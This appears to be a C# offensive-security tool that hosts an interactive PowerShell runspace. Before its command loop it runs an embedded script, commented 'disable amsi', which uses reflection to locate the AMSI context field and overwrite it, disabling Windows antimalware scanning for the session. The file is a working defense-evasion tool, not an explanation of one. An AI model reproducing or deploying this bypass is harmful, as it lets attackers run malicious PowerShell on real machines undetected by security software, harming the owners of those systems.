using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;

namespace InteractiveRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            string cmd;
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // disable amsi
            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
            ps.Invoke();
            
            while (true)
            {
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();
               
                cmd = Console.ReadLine();
               
                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
                
               
            }

            rs.Close();
        }
    }
}
